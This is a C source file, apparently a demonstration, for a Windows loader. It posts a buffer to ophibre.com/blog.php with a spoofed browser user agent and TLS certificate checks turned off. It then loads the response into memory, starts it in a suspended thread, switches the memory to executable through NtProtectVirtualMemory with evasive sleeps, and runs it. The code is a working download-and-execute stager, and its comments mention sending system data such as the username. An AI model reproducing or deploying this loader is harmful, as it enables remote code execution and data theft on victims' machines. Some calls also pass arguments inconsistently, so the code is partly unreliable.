/**
 * @file dummy.c
 * @brief A simple C program that demonstrates the use of WinHTTP to send a POST
 * request and execute a payload received in the response.
 *
 * This program allocates memory, opens an HTTP session, sends a request,
 * receives a response, and executes a payload in a new thread after changing
 * memory protection.
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <windows.h>
#include <winhttp.h>

typedef NTSTATUS(NTAPI *NtProtectVirtualMemory_t)(HANDLE ProcessHandle,
                                                  PVOID *BaseAddress,
                                                  PULONG RegionSize,
                                                  ULONG NewProtect,
                                                  PULONG OldProtection);

int main() {

  NtProtectVirtualMemory_t NtProtectVirtualMemory =
      (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                               "NtProtectVirtualMemory");

  int64_t *allocated_memory_space = NULL;

  LPCWSTR userAgent =
      L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, "
      L"like Gecko) Chrome/132.0.0.0 Safari/537.36";
  LPCWSTR serverName =
      L"ophibre.com"; // Make sure this resolves to localhost on your computer
  INTERNET_PORT serverPort = 443;
  LPCWSTR requestType = L"POST";
  LPCWSTR targetRessource = L"blog.php";
  DWORD flag = 0x3300;

  printf("[INFO] Allocating memory for personnal data from the system "
         "(username, desktop name, etc)\n");
  void *lpOptional = malloc(0x648);
  if (!lpOptional) {
    printf("[ERROR] Memory allocation failed.\n");
    return 1;
  }
  memset(lpOptional, 'A', 0x648);

  printf("[INFO] Opening an HTTP session with user agent: %ls\n", userAgent);
  HINTERNET hSession =
      WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
  if (!hSession) {
    printf("[ERROR] WinHttpOpen failed. Error: %lu\n", GetLastError());
    return 1;
  }

  printf("[INFO] Connecting to server: %ls on port: %d\n", serverName,
         serverPort);
  HINTERNET hConnect = WinHttpConnect(hSession, serverName, serverPort, 0);
  if (!hConnect) {
    printf("[ERROR] WinHttpConnect failed. Error: %lu\n", GetLastError());
    WinHttpCloseHandle(hSession);
    return 1;
  }

  printf("[INFO] Opening an HTTP request with method: %ls and resource: %ls\n",
         requestType, targetRessource);
  HINTERNET hRequest = WinHttpOpenRequest(
      hConnect, requestType, targetRessource, NULL, WINHTTP_NO_REFERER,
      WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (!hRequest) {
    printf("[ERROR] WinHttpOpenRequest failed. Error: %lu\n", GetLastError());
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  printf("[INFO] Setting HTTP option with flag: 0x%x\n", flag);
  BOOL successOption = WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                                        &flag, sizeof(flag));
  if (!successOption) {
    printf("[ERROR] WinHttpSetOption failed. Error: %lu\n", GetLastError());
  }

  printf("[INFO] Sending HTTP request with optional data...\n");
  BOOL successSend = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
                                        0, lpOptional, 0x648, 0x648, 0);

  if (successSend) {
    printf("[SUCCESS] HTTP request sent successfully.\n");
  } else {
    printf("[ERROR] Failed to send HTTP request. Error: %lu\n", GetLastError());
  }

  printf("[INFO] Receiving HTTP response...\n");
  BOOL successReceive = WinHttpReceiveResponse(hRequest, NULL);

  if (successReceive) {
    printf("[SUCCESS] HTTP response received successfully.\n");
  } else {
    printf("[ERROR] Failed to receive HTTP response. Error: %lu\n",
           GetLastError());
  }

  printf("[INFO] Querying HTTP headers...\n");
  int32_t content_size = 0;
  DWORD bufferLength = sizeof(content_size);

  BOOL successQueryHeaders = WinHttpQueryHeaders(
      hRequest, 0x20000005, NULL, &content_size, &bufferLength, NULL);

  if (content_size) {
    printf("[SUCCESS] HTTP headers queried successfully.");

    DWORD status_code = 0;
    DWORD size = sizeof(status_code);

    WinHttpQueryHeaders(hRequest, 0x20000013, NULL, &status_code, &size, NULL);

    printf("[INFO] Returned: %lu (0x%X)\n", status_code, status_code);
    if (status_code == 0xc8) {

      int32_t nb_bytes_read = 0;
      void *allocatedSpaceAddress =
          VirtualAlloc(0, (uint64_t)content_size, 0x3000, 4);

      BOOL success_read =
          WinHttpReadData(hRequest, allocatedSpaceAddress, (DWORD)content_size,
                          (LPDWORD)&nb_bytes_read);

      if (content_size) {
        printf("[INFO] Read %d bytes from the response.\n\n", nb_bytes_read);
        printf("[PAYLOAD START]\n%.*s\n[PAYLOAD END]\n", nb_bytes_read,
               (char *)allocatedSpaceAddress);

        ULONG regionSize = (ULONG)content_size;

        ULONG OldProtection = 0;
        NtProtectVirtualMemory(-1, allocatedSpaceAddress, regionSize,
                               PAGE_NOACCESS, &OldProtection);

        printf("Memory protection changed : %lu\n", OldProtection);

        HANDLE hThread = CreateThread(0, 0, allocatedSpaceAddress, 0, 4, 0);

        printf("Thread created with handle: %p\n", hThread);

        printf("Sleep for 10 seconds before changing protection...\n");
        Sleep(0x2710);

        NtProtectVirtualMemory(-1, allocatedSpaceAddress, &regionSize,
                               PAGE_EXECUTE_READWRITE, &OldProtection);

        printf("Memory protection changed : %lu\n", OldProtection);

        printf("Sleep for 10 seconds before resuming thread...\n");
        Sleep(0x2710);

        printf("Execute payload in thread: %p\n", hThread);
        ResumeThread(hThread);

      } else {
        printf("[ERROR] No content received in the response.\n");
      }
    }
  }

  // Clean up
  if (hRequest)
    WinHttpCloseHandle(hRequest);
  if (hConnect)
    WinHttpCloseHandle(hConnect);
  if (hSession)
    WinHttpCloseHandle(hSession);
  if (lpOptional)
    free(lpOptional);

  return 0;
}
